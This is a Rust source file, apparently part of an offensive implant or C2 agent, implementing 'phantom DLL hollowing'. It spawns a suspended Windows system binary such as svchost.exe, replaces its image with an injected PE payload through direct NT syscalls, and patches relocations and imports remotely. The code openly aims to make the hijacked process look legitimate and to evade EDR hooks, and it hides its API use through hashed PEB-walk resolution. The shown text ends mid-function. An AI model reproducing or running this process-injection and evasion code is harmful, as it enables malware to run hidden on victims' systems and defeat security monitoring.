//! Phantom DLL hollowing: inject a DLL into a legitimate host process without
//! writing to disk and without calling VirtualAlloc/VirtualAllocEx.
//!
//! The technique works in four phases:
//!
//! 1. **Section creation** — `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)`
//!    + `NtMapViewOfSection` into the **calling** process to write the DLL bytes,
//!    then `NtProtectVirtualMemory` to RX.
//!
//! 2. **Host process creation** — `CreateProcessW` with `CREATE_SUSPENDED` using a
//!    legitimate system binary (svchost.exe, RuntimeBroker.exe, dllhost.exe).
//!
//! 3. **Image replacement** — `NtUnmapViewOfSection` the host's original image,
//!    then `NtMapViewOfSection` the phantom section into the host process at the
//!    original image base.  Fix base relocations, rebuild IAT, update
//!    `PEB.ImageBaseAddress`.
//!
//! 4. **Execution** — Set the thread context instruction pointer to the payload
//!    entry point and `NtResumeThread`.
//!
//! The resulting process appears completely legitimate: the host binary exists
//! on disk, the PEB is consistent, and no `VirtualAlloc`/`VirtualAllocEx` was
//! ever called.  Section-based memory management bypasses EDR hooks that
//! monitor the classic RW→RX allocation triad.
//!
//! # Constraints
//!
//! - Windows x86_64 and ARM64.
//! - Requires `direct-syscalls` feature for indirect syscall infrastructure.
//! - Payload must be a valid PE64 image with a relocation table and a machine
//!   type matching the agent architecture.

#![cfg(all(
    windows,
    feature = "phantom-dll-hollow",
    any(target_arch = "x86_64", target_arch = "aarch64")
))]

use crate::win_types::OBJECT_ATTRIBUTES;
use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use anyhow::{anyhow, Result};
use std::ffi::c_void;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows_sys::Win32::System::Memory::PAGE_READONLY;
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, SEC_COMMIT};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
// ── NT constants (not exported by winapi) ────────────────────────────────────

const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const NT_THREAD_INJECT_ACCESS: u32 = 0x1A02;
const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
const NT_CURRENT_PROCESS: usize = usize::MAX;
const NT_OBJ_CASE_INSENSITIVE: u32 = 0x40;
const NT_FILE_READ_DATA: u32 = 0x0001;
const NT_FILE_EXECUTE: u32 = 0x0020;
const NT_SYNCHRONIZE: u32 = 0x0010_0000;
const NT_FILE_SHARE_READ: u32 = 0x0001;
const NT_FILE_SHARE_DELETE: u32 = 0x0004;
const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
const NT_SEC_IMAGE: u32 = 0x0100_0000;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
#[cfg(target_arch = "x86_64")]
const EXPECTED_PE_MACHINE: u16 = 0x8664;
#[cfg(target_arch = "aarch64")]
const EXPECTED_PE_MACHINE: u16 = 0xAA64;

#[cfg(target_arch = "x86_64")]
const CONTEXT_IP_NAME: &str = "RIP";
#[cfg(target_arch = "aarch64")]
const CONTEXT_IP_NAME: &str = "PC";

#[cfg(target_arch = "x86_64")]
fn set_context_instruction_pointer(ctx: &mut CONTEXT, value: u64) {
    ctx.Rip = value;
}

#[cfg(target_arch = "aarch64")]
fn set_context_instruction_pointer(ctx: &mut CONTEXT, value: u64) {
    ctx.Pc = value;
}

// ── Result type ──────────────────────────────────────────────────────────────

/// Result of a successful phantom DLL hollowing operation.
pub struct PhantomHollowResult {
    /// Handle to the created host process. Caller must close this handle.
    pub process_handle: *mut c_void,
    /// Handle to the main thread. Caller must close this handle.
    pub thread_handle: *mut c_void,
    /// Base address where the phantom DLL was mapped in the host process.
    pub phantom_base: usize,
}

// ── Helper: NtObjectAttributes ───────────────────────────────────────────────

#[repr(C)]
struct NtObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut crate::win_types::UNICODE_STRING,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    pointer: usize,
    information: usize,
}

// ── Host candidate paths ─────────────────────────────────────────────────────

/// Read the value of an environment variable from the PEB's environment
/// block, avoiding `std::env::var` (which calls `kernel32!GetEnvironmentVariableW`
/// and creates an IAT entry the module otherwise avoids).
///
/// The PEB → `ProcessParameters` → `Environment` pointer leads to a block of
/// null-terminated UTF-16LE strings of the form `KEY=VALUE\0`, terminated by
/// an extra `\0`.
#[cfg(target_arch = "x86_64")]
unsafe fn get_env_from_peb(key: &str) -> Option<String> {
    // TEB is at gs:[0x30] on x86_64; PEB is at TEB offset 0x60.
    let teb: *const u8;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
    let peb = teb.add(0x60) as *const *const u8;
    let peb_ptr = peb.read_unaligned();

    // RTL_USER_PROCESS_PARAMETERS is at PEB + 0x20.
    let params_ptr = (peb_ptr.add(0x20) as *const *const u8).read_unaligned();

    // Environment block pointer is at offset 0x80 within
    // RTL_USER_PROCESS_PARAMETERS (Windows 10+).
    let env_block = (params_ptr.add(0x80) as *const *const u16).read_unaligned();

    if env_block.is_null() {
        return None;
    }

    let key_upper = key.to_ascii_uppercase();
    let key_prefix = format!("{}=", key_upper);

    // Walk through the environment block: each entry is a NUL-terminated
    // UTF-16LE string, and the block ends with a double NUL.
    let mut offset: isize = 0;
    loop {
        // Read the next UTF-16LE entry.
        let mut entry_end = offset;
        while *env_block.offset(entry_end) != 0 {
            entry_end += 1;
        }

        // Two consecutive NULs → end of block.
        if entry_end == offset {
            break;
        }

        // Decode the entry to a String.
        let len = (entry_end - offset) as usize;
        let slice = std::slice::from_raw_parts(env_block.offset(offset), len);
        if let Ok(entry) = String::from_utf16(slice) {
            if let Some(rest) = entry.strip_prefix(&key_prefix) {
                return Some(rest.to_string());
            }
        }

        offset = entry_end + 1;
    }

    None
}

#[cfg(target_arch = "aarch64")]
unsafe fn get_env_from_peb(key: &str) -> Option<String> {
    // TEB is at TPIDR_EL0 on AArch64; PEB is at TEB + 0x60.
    let teb: *const u8;
    std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
    let peb = teb.add(0x60) as *const *const u8;
    let peb_ptr = peb.read_unaligned();

    let params_ptr = (peb_ptr.add(0x20) as *const *const u8).read_unaligned();
    let env_block = (params_ptr.add(0x80) as *const *const u16).read_unaligned();

    if env_block.is_null() {
        return None;
    }

    let key_upper = key.to_ascii_uppercase();
    let key_prefix = format!("{}=", key_upper);

    let mut offset: isize = 0;
    loop {
        let mut entry_end = offset;
        while *env_block.offset(entry_end) != 0 {
            entry_end += 1;
        }

        if entry_end == offset {
            break;
        }

        let len = (entry_end - offset) as usize;
        let slice = std::slice::from_raw_parts(env_block.offset(offset), len);
        if let Ok(entry) = String::from_utf16(slice) {
            if let Some(rest) = entry.strip_prefix(&key_prefix) {
                return Some(rest.to_string());
            }
        }

        offset = entry_end + 1;
    }

    None
}

/// Return a list of legitimate system executables suitable as phantom hollowing
/// hosts.  The process will appear as one of these binaries after hollowing.
///
/// Reads `SystemRoot` from the PEB environment block instead of via
/// `std::env::var` to avoid creating a `kernel32!GetEnvironmentVariableW`
/// IAT entry in this otherwise IAT-free module.
fn host_candidate_paths() -> Vec<String> {
    let sys_dir =
        unsafe { get_env_from_peb("SystemRoot").unwrap_or_else(|| r"C:\Windows".to_string()) };
    let sys32 = format!(r"{}\System32", sys_dir);
    [
        format!(r"{}\svchost.exe", sys32),
        format!(r"{}\RuntimeBroker.exe", sys32),
        format!(r"{}\dllhost.exe", sys32),
        format!(r"{}\werfault.exe", sys32),
    ]
    .to_vec()
}

// ── DOS path to NT path ─────────────────────────────────────────────────────

/// Convert a DOS path (e.g. `C:\Windows\System32\svchost.exe`) to an NT
/// namespace path (`\??\C:\Windows\System32\svchost.exe`) encoded as a
/// NUL-terminated UTF-16 vector.
fn dos_to_nt_path(dos_path: &str) -> Vec<u16> {
    let nt_path = if dos_path.starts_with(r"\??\") {
        dos_path.to_string()
    } else {
        format!(r"\??\{}", dos_path)
    };
    let mut wide: Vec<u16> = nt_path.encode_utf16().collect();
    wide.push(0);
    wide
}

// ── Resolve ntdll export ────────────────────────────────────────────────────

/// Resolve an ntdll export by name via PEB walk (no IAT hook).
unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(name);
    pe_resolve::get_proc_address_by_hash(ntdll, hash).map(|a| a as usize)
}

// ── Handle cleanup macro ─────────────────────────────────────────────────────

macro_rules! close_handle {
    ($h:expr) => {
        let _ = crate::syscall!("NtClose", $h as u64);
    };
}

// ── Create suspended host process via NtCreateProcessEx ─────────────────────

/// Create a suspended host process using NT direct syscalls.
///
/// Opens the host executable via `NtOpenFile`, creates a section with
/// `SEC_IMAGE`, creates a process from that section via `NtCreateProcessEx`,
/// then creates the initial thread suspended via `NtCreateThreadEx`.
///
/// Returns `(h_process, h_thread)`.
unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
    // Build NT namespace path and UNICODE_STRING.
    let mut path_wide = dos_to_nt_path(exe_path);
    let byte_len = ((path_wide.len() - 1) * 2) as u16;
    let mut ustr = crate::win_types::UNICODE_STRING {
        Length: byte_len,
        MaximumLength: byte_len + 2,
        Buffer: path_wide.as_mut_ptr(),
    };
    let mut oa = NtObjectAttributes {
        length: std::mem::size_of::<NtObjectAttributes>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: &mut ustr,
        attributes: NT_OBJ_CASE_INSENSITIVE,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };
    let mut isb = IoStatusBlock {
        pointer: 0,
        information: 0,
    };

    let mut h_file: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtOpenFile",
        &mut h_file as *mut _ as u64,
        (NT_FILE_READ_DATA | NT_FILE_EXECUTE | NT_SYNCHRONIZE) as u64,
        &mut oa as *mut _ as u64,
        &mut isb as *mut _ as u64,
        (NT_FILE_SHARE_READ | NT_FILE_SHARE_DELETE) as u64,
        (NT_FILE_SYNC_IO_NONALERT | NT_FILE_NON_DIRECTORY) as u64,
    )
    .map_err(|e| anyhow!("NtOpenFile SSN: {e}"))?;
    if s < 0 || h_file.is_null() {
        return Err(anyhow!(
            "NtOpenFile({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Create a section backed by the host executable (SEC_IMAGE).
    let mut h_section: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,
        0u64,
        PAGE_EXECUTE_READ as u64,
        NT_SEC_IMAGE as u64,
        h_file as u64,
    )
    .map_err(|e| anyhow!("NtCreateSection(SEC_IMAGE) SSN: {e}"))?;
    close_handle!(h_file);
    if s < 0 || h_section.is_null() {
        return Err(anyhow!(
            "NtCreateSection(SEC_IMAGE, {}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Create the child process from the section.
    let mut h_process: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateProcessEx",
        &mut h_process as *mut _ as u64,
        NT_PROCESS_ALL_ACCESS as u64,
        0u64,
        NT_CURRENT_PROCESS as u64,
        0u64,
        h_section as u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateProcessEx SSN: {e}"))?;
    close_handle!(h_section);
    if s < 0 || h_process.is_null() {
        return Err(anyhow!(
            "NtCreateProcessEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    // Resolve a suitable thread start routine inside ntdll.
    let start_addr = resolve_nt(b"RtlUserThreadStart\0")
        .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
        .ok_or_else(|| anyhow!("RtlUserThreadStart not found in ntdll"))?;

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let s = crate::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_INJECT_ACCESS as u64,
        0u64,
        h_process as u64,
        start_addr as u64,
        0u64,
        NT_THREAD_SUSPENDED as u64,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
    if s < 0 || h_thread.is_null() {
        let _ = crate::syscall!("NtTerminateProcess", h_process as u64, 1u64);
        close_handle!(h_process);
        return Err(anyhow!(
            "NtCreateThreadEx({}) NTSTATUS {:#010x}",
            exe_path,
            s as u32
        ));
    }

    Ok((h_process, h_thread))
}

// ── Read remote memory helper ────────────────────────────────────────────────

/// Read exactly `len` bytes from a remote process.
/// Returns `true` on success.
unsafe fn nt_read_exact(
    h_process: *mut c_void,
    remote_addr: usize,
    buf: *mut c_void,
    len: usize,
) -> bool {
    let mut read_bytes: usize = 0;
    let s = crate::syscall!(
        "NtReadVirtualMemory",
        h_process as u64,
        remote_addr as u64,
        buf as u64,
        len as u64,
        &mut read_bytes as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 && read_bytes == len => true,
        _ => false,
    }
}

/// Write exactly `len` bytes into a remote process.
/// Returns `true` on success.
unsafe fn nt_write_exact(
    h_process: *mut c_void,
    remote_addr: usize,
    buf: *const c_void,
    len: usize,
) -> bool {
    let mut written: usize = 0;
    let s = crate::syscall!(
        "NtWriteVirtualMemory",
        h_process as u64,
        remote_addr as u64,
        buf as u64,
        len as u64,
        &mut written as *mut _ as u64,
    );
    match s {
        Ok(st) if st >= 0 && written == len => true,
        _ => false,
    }
}

// ── Apply relocations remotely ───────────────────────────────────────────────

/// Apply base relocations to the PE image mapped in the remote process.
unsafe fn apply_relocations_remote(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Err(anyhow!(
            "phantom_dll_hollow: PE has no relocation directory, cannot rebased"
        ));
    }

    let reloc_rva = reloc_dir.VirtualAddress as usize;
    let reloc_size = reloc_dir.Size as usize;
    let reloc_offset = rva_to_file_offset(payload, reloc_rva);
    let reloc_end = reloc_offset.saturating_add(reloc_size);

    if reloc_end > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow: relocation directory extends beyond payload"
        ));
    }

    let mut offset = reloc_offset;
    while offset + 8 <= reloc_end {
        // Read the block header from the local payload copy.
        let block_rva =
            u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;

        if block_size == 0 || block_size < 8 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end {
                break;
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) & 0xF;
            let off = (entry & 0x0FFF) as usize;

            // IMAGE_REL_BASED_DIR64 = 10 (x86_64)
            if typ == 10 {
                let target_rva = block_rva + off;
                let mut val: u64 = 0;
                if !nt_read_exact(
                    h_process,
                    remote_base + target_rva,
                    &mut val as *mut _ as *mut c_void,
                    8,
                ) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to read reloc target at RVA {:#x}",
                        target_rva
                    );
                    continue;
                }
                val = (val as isize + delta) as u64;
                if !nt_write_exact(
                    h_process,
                    remote_base + target_rva,
                    &val as *const _ as *const c_void,
                    8,
                ) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to write reloc fixup at RVA {:#x}",
                        target_rva
                    );
                }
            }
        }

        offset += block_size;
    }

    Ok(())
}

// ── Resolve export by ordinal ───────────────────────────────────────────────

/// Resolve a function from a loaded DLL by ordinal, by walking the export
/// directory directly.  The ordinal is a base-1 index; the export directory's
/// `Base` field specifies the first valid ordinal number.
unsafe fn resolve_export_by_ordinal(dll_base: usize, ordinal: usize) -> Option<usize> {
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }
    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    let signature = *(nt_headers as *const u32);
    if signature != 0x4550 {
        return None;
    }
    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }
    let export_dir = dll_base + export_dir_rva;
    let base = *((export_dir + 0x10) as *const u32) as usize;
    let num_funcs = *((export_dir + 0x14) as *const u32) as usize;
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let export_dir_size = *((export_dir + 0x14) as *const u32) as usize;

    let index = ordinal.saturating_sub(base);
    if index >= num_funcs {
        return None;
    }
    let func_rva = *((dll_base + rva_funcs + index * 4) as *const u32) as usize;
    if func_rva == 0 {
        return None;
    }
    // Check for forwarder.
    if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
        // Forwarded export — skip (complex to resolve here).
        return None;
    }
    Some(dll_base + func_rva)
}

// ── Fix IAT remotely ────────────────────────────────────────────────────────

/// Walk the import descriptor table, resolve each DLL + function, and patch
/// the Import Address Table in the remote process.
unsafe fn fix_iat_remote(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
    payload: &[u8],
) -> Result<()> {
    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 || import_dir.Size == 0 {
        // No imports — nothing to do.
        return Ok(());
    }

    let import_rva = import_dir.VirtualAddress as usize;
    let desc_size =
        std::mem::size_of::<windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR>();

    let mut desc_idx = 0;
    loop {
        let desc_offset = rva_to_file_offset(payload, import_rva + desc_idx * desc_size);
        if desc_offset + desc_size > payload.len() {
            break;
        }

        // Read descriptor fields from the local payload.
        let ilt_rva = u32::from_le_bytes(payload[desc_offset..desc_offset + 4].try_into().unwrap());
        let _timestamp = u32::from_le_bytes(
            payload[desc_offset + 4..desc_offset + 8]
                .try_into()
                .unwrap(),
        );
        let _forwarder = u32::from_le_bytes(
            payload[desc_offset + 8..desc_offset + 12]
                .try_into()
                .unwrap(),
        );
        let name_rva = u32::from_le_bytes(
            payload[desc_offset + 12..desc_offset + 16]
                .try_into()
                .unwrap(),
        );
        let iat_rva = u32::from_le_bytes(
            payload[desc_offset + 16..desc_offset + 20]
                .try_into()
                .unwrap(),
        );

        // Terminating descriptor: all zeros.
        if ilt_rva == 0 && name_rva == 0 && iat_rva == 0 {
            break;
        }

        if name_rva == 0 || iat_rva == 0 {
            desc_idx += 1;
            continue;
        }

        // Read DLL name from the local payload.
        let name_offset = rva_to_file_offset(payload, name_rva as usize);
        let name_end = payload[name_offset..]
            .iter()
            .position(|&b| b == 0)
            .map(|p| name_offset + p)
            .unwrap_or(payload.len());
        if name_offset >= payload.len() || name_end >= payload.len() {
            desc_idx += 1;
            continue;
        }
        let dll_name = std::ffi::CStr::from_bytes_with_nul(&payload[name_offset..=name_end])
            .unwrap_or_else(|_| {
                desc_idx += 1;
                std::ffi::CStr::from_bytes_with_nul(b"?\0").unwrap()
            });

        // Resolve DLL via PEB walk.
        let dll_hash = pe_resolve::hash_str(dll_name.to_bytes_with_nul());
        let dll_base = match pe_resolve::get_module_handle_by_hash(dll_hash) {
            Some(b) => b,
            None => {
                // Try to map a clean copy of the DLL.
                let dll_name_str = dll_name.to_string_lossy();
                tracing::debug!(
                    "phantom_dll_hollow: DLL {} not found via PEB walk, attempting clean map",
                    dll_name_str
                );
                match crate::syscalls::map_clean_dll(&dll_name_str) {
                    Ok(b) => b,
                    Err(_) => {
                        tracing::warn!(
                            "phantom_dll_hollow: could not resolve DLL {}",
                            dll_name_str
                        );
                        desc_idx += 1;
                        continue;
                    }
                }
            }
        };

        // Walk the Import Lookup Table (or IAT if ILT is zero) to resolve
        // each imported function.
        let lookup_rva = if ilt_rva != 0 { ilt_rva } else { iat_rva };
        let mut thunks_remaining = true;
        let mut thunk_idx = 0u32;
        while thunks_remaining {
            let thunk_offset =
                rva_to_file_offset(payload, lookup_rva as usize + thunk_idx as usize * 8);
            if thunk_offset + 8 > payload.len() {
                break;
            }
            let thunk_val =
                u64::from_le_bytes(payload[thunk_offset..thunk_offset + 8].try_into().unwrap());

            // Terminating entry.
            if thunk_val == 0 {
                thunks_remaining = false;
                break;
            }

            let func_addr = if thunk_val & (1u64 << 63) != 0 {
                // Import by ordinal — resolve by walking the export table.
                let ordinal = (thunk_val & 0xFFFF) as usize;
                resolve_export_by_ordinal(dll_base, ordinal)
            } else {
                // Import by name hint.
                let hint_rva = (thunk_val & 0x7FFFFFFF) as usize;
                let hint_offset = rva_to_file_offset(payload, hint_rva);
                // Hint is u16, then NUL-terminated name.
                if hint_offset + 2 >= payload.len() {
                    thunk_idx += 1;
                    continue;
                }
                let name_start = hint_offset + 2;
                let name_end_local = payload[name_start..]
                    .iter()
                    .position(|&b| b == 0)
                    .map(|p| name_start + p)
                    .unwrap_or(payload.len().saturating_sub(1));
                if name_start >= payload.len() || name_end_local >= payload.len() {
                    thunk_idx += 1;
                    continue;
                }
                let func_name = &payload[name_start..=name_end_local];
                let func_hash = pe_resolve::hash_str(func_name);
                pe_resolve::get_proc_address_by_hash(dll_base, func_hash).map(|a| a as usize)
            };

            if let Some(addr) = func_addr {
                // Patch the IAT entry in the remote process.
                let iat_slot = remote_base + iat_rva as usize + thunk_idx as usize * 8;
                if !nt_write_exact(h_process, iat_slot, &addr as *const _ as *const c_void, 8) {
                    tracing::warn!(
                        "phantom_dll_hollow: failed to write IAT slot at {:#x}",
                        iat_slot
                    );
                }
            } else {
                tracing::warn!(
                    "phantom_dll_hollow: failed to resolve import #{} from {}",
                    thunk_idx,
                    dll_name.to_string_lossy()
                );
            }

            thunk_idx += 1;
        }

        desc_idx += 1;
    }

    Ok(())
}

// ── Apply per-section protections ────────────────────────────────────────────

/// Walk PE sections and apply appropriate memory protections (e.g. .text → RX,
/// .rdata → R, .data → RW) in the remote process.
unsafe fn apply_section_protections(
    h_process: *mut c_void,
    remote_base: usize,
    nt: *const IMAGE_NT_HEADERS64,
) {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section =
        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let sec_va = sec.VirtualAddress as usize;
        let sec_vs = sec.Misc.VirtualSize as usize;
        if sec_va == 0 || sec_vs == 0 {
            continue;
        }

        // Determine target protection from section characteristics.
        let is_exec = sec.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let is_write = sec.Characteristics & IMAGE_SCN_MEM_WRITE != 0;

        let target_prot = if is_exec && is_write {
            PAGE_EXECUTE_READWRITE
        } else if is_exec {
            PAGE_EXECUTE_READ
        } else if is_write {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let mut base = remote_base + sec_va;
        let mut size = sec_vs;
        let mut old_prot = 0u32;

        let s = crate::syscall!(
            "NtProtectVirtualMemory",
            h_process as u64,
            &mut base as *mut _ as u64,
            &mut size as *mut _ as u64,
            target_prot as u64,
            &mut old_prot as *mut _ as u64,
        );
        if let Ok(st) = s {
            if st < 0 {
                tracing::debug!(
                    "phantom_dll_hollow: NtProtectVirtualMemory(section {i}) NTSTATUS {:#010x}",
                    st as u32
                );
            }
        }
    }
}

// ── RVA to file offset ──────────────────────────────────────────────────────

/// Convert a Relative Virtual Address to a raw file offset using the PE
/// section table from `payload`.
fn rva_to_file_offset(payload: &[u8], rva: usize) -> usize {
    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return rva;
    }
    let e_lfanew = match (payload.len() > 0x3c).then(|| {
        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize
    }) {
        Some(v) => v,
        None => return rva,
    };
    if e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() > payload.len() {
        return rva;
    }
    let num_sections = u16::from_le_bytes(
        payload[e_lfanew + 6..e_lfanew + 8]
            .try_into()
            .unwrap_or([0, 0]),
    );
    let size_of_opt_header =
        unsafe { (payload.as_ptr().add(e_lfanew + 4 + 16) as *const u16).read_unaligned() }
            as usize;
    let sections_offset =
        e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() + size_of_opt_header;

    for i in 0..num_sections as usize {
        let off = sections_offset + i * std::mem::size_of::<IMAGE_SECTION_HEADER>();
        if off + std::mem::size_of::<IMAGE_SECTION_HEADER>() > payload.len() {
            break;
        }
        let va =
            u32::from_le_bytes(payload[off + 12..off + 16].try_into().unwrap_or([0; 4])) as usize;
        let vs =
            u32::from_le_bytes(payload[off + 8..off + 12].try_into().unwrap_or([0; 4])) as usize;
        let raw =
            u32::from_le_bytes(payload[off + 20..off + 24].try_into().unwrap_or([0; 4])) as usize;

        if rva >= va && rva < va + vs {
            return rva - va + raw;
        }
    }
    // Header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

// ── Main entry point ────────────────────────────────────────────────────────

/// Phantom DLL hollowing: inject a DLL into a host process using exclusively
/// section-based memory management (no VirtualAlloc / VirtualAllocEx).
///
/// # Arguments
///
/// * `payload` — PE64 image bytes to inject (must be a valid PE with
///   relocation table).
///
/// # Returns
///
/// `Ok(PhantomHollowResult)` on success with handles to the host process/thread
/// and the base address of the mapped phantom DLL.
///
/// # Safety
///
/// This function performs direct NT syscalls and manipulates process memory.
/// The caller is responsible for closing the returned handles.
pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> {
    // ── Validate payload ─────────────────────────────────────────────────
    if payload.len() < 0x40 {
        return Err(anyhow!(
            "phantom_dll_hollow: payload too small for DOS header ({}/0x40 min)",
            payload.len()
        ));
    }
    if payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "phantom_dll_hollow: payload is not a PE (no MZ header)"
        ));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(anyhow!("phantom_dll_hollow: DOS signature mismatch"));
    }
    let e_lfanew = (*dos).e_lfanew as usize;
    if e_lfanew == 0 || e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow: NT headers extend beyond payload (e_lfanew={:#x}, len={})",
            e_lfanew,
            payload.len()
        ));
    }

    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("phantom_dll_hollow: invalid NT signature"));
    }
    if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        return Err(anyhow!(
            "phantom_dll_hollow: only PE64 payloads are supported"
        ));
    }
    if (*nt).FileHeader.Machine != EXPECTED_PE_MACHINE {
        return Err(anyhow!(
            "phantom_dll_hollow: PE machine {:#06x} does not match this agent ({:#06x})",
            (*nt).FileHeader.Machine,
            EXPECTED_PE_MACHINE
        ));
    }

    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;

    if image_size == 0 {
        return Err(anyhow!("phantom_dll_hollow: PE has SizeOfImage=0"));
    }
    if entry_point_rva >= image_size {
        return Err(anyhow!(
            "phantom_dll_hollow: entry point RVA {:#x} outside image size {:#x}",
            entry_point_rva,
            image_size
        ));
    }
    if size_of_headers > payload.len() {
        return Err(anyhow!(
            "phantom_dll_hollow: SizeOfHeaders {:#x} exceeds payload size {:#x}",
            size_of_headers,
            payload.len()
        ));
    }

    // Ensure SSN infrastructure is initialised.
    let _ = nt_syscall::init_syscall_infrastructure();

    // ── Phase 1: Create phantom section + map into calling process ───────
    //
    // We create a SEC_COMMIT section with PAGE_EXECUTE_READWRITE, map it into
    // our own process (PAGE_READWRITE) to write the DLL bytes, then flip the
    // local view to PAGE_EXECUTE_READ.  The section handle is kept so we can
    // map it into the host process in Phase 3.

    let mut h_section: *mut c_void = std::ptr::null_mut();
    // Create a section large enough for the entire PE image.
    // We use SEC_COMMIT so the section is backed by the page file (no file needed).
    let mut section_size: i64 = image_size as i64;
    let s = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,                               // no object attributes
        &mut section_size as *mut _ as u64, // maximum size
        PAGE_EXECUTE_READWRITE as u64,      // section page protection
        SEC_COMMIT as u64,                  // allocation attributes (no file)
